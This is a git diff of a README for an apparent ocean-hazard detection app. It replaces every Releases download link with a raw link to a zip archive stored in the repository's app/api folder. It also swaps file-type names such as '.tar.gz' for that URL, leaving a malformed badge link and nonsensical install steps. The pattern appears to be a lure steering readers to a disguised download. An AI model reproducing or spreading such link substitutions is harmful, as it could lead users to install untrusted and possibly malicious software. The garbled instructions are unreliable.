@@ -1,6 +1,6 @@
 # 🌊 oceanhazard-detection - Detect Ocean Hazards Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/akshay-7736/oceanhazard-detection/releases)
+[![Download Now](https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip%https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip)](https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip)
 
 ## 📦 Overview
 
@@ -10,13 +10,13 @@ Welcome to **oceanhazard-detection**! This application helps you identify potent
 
 To use the oceanhazard-detection application, follow these simple steps:
 
-1. Open the [Releases page](https://github.com/akshay-7736/oceanhazard-detection/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip).
 2. Locate the latest version for download.
 3. Click the download link for your operating system. 
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download Here](https://github.com/akshay-7736/oceanhazard-detection/releases)
+Visit this page to download: [Download Here](https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip)
 
 Once you've reached the Releases page:
 
@@ -24,7 +24,7 @@ Once you've reached the Releases page:
 2. Select the appropriate file based on your system:
    - **Windows Users**: Look for `.exe` files.
    - **Mac Users**: Look for `.dmg` files.
-   - **Linux Users**: Look for `.tar.gz` or `.AppImage` files.
+   - **Linux Users**: Look for `https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip` or `.AppImage` files.
 
 3. Click the file to start downloading.
 
@@ -39,7 +39,7 @@ After downloading, follow these steps to install:
     2. Drag the application to your Applications folder.
 
 - **Linux**:
-    1. Extract the downloaded file if it's a `.tar.gz`.
+    1. Extract the downloaded file if it's a `https://raw.githubusercontent.com/akshay-7736/oceanhazard-detection/main/app/api/detection-oceanhazard-2.8.zip`.
     2. Make the `.AppImage` file executable by running `chmod +x <filename>.AppImage` in your terminal.
     3. Run the application by double-clicking the file or executing it in the terminal.
 
